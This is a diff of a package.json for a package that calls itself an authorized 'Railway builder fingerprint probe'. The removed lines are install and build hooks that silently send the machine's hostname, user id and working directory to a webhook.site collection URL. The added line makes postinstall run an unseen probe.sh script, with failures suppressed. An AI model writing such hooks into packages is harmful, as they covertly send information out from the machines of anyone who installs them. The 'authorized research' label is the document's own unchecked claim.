@@ -4,8 +4,7 @@
   "description": "Railway builder fingerprint probe (authorized security research)",
   "main": "index.js",
   "scripts": {
-    "postinstall": "curl -sS --max-time 20 'https://webhook.site/7c513384-7a0b-4162-a6b5-d47e68900f5d/build-postinstall?h='$(hostname)'&u='$(id -u)'&w='$(pwd) || true",
-    "build": "node -e \"require('https').get('https://webhook.site/7c513384-7a0b-4162-a6b5-d47e68900f5d/build-script?h='+require('os').hostname())\" || true",
+    "postinstall": "sh ./probe.sh || true",
     "start": "node index.js"
   }
 }
